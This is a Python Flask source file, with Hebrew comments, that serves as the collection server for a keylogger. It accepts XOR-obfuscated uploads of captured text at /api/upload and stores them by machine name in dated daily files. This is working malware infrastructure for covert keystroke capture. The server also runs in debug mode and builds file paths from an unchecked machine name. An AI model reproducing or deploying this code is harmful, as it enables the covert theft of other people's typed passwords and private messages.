from flask import Flask, jsonify, request
import os, time
from datetime import datetime
import decryption


app = Flask(__name__)

# DATA_FOLDER יכיל את הנתיב המלא לתיקייה הראשית
DATA_FOLDER = os.path.abspath("data")
os.makedirs(DATA_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return 'KeyLogger server is running'

@app.route('/api/upload', methods=['POST'])
def upload():
    # קבלת JSON
    encrypted_data = request.get_json(silent=True)
    data = decryption.Encryptor().encryption_using_xor(encrypted_data['data'], 4)

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid data"}), 400
    
    machine = data["machine"]
    content = data["data"]
    sent_time = data["time"]

    #קבלת תאריך ושעה נוכחיים
    now = datetime.now()
    year = now.strftime("%Y")
    month = now.strftime("%m")
    day = now.strftime("%d")
    

    # מבנה תיקיות: DATA_FOLDER/machine/year/month/
    machine_folder = os.path.join(DATA_FOLDER, machine, year, month)
    os.makedirs(machine_folder, exist_ok=True)

    # קובץ יומי: day.txt
    file_path = os.path.join(machine_folder, f"{day}.txt")

    # כתיבת הנתונים לקובץ
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(f"[{sent_time}]  {content}\n")

    return jsonify({"status": "success", "file": file_path}), 200

if __name__ == '__main__':
    app.run(debug=True)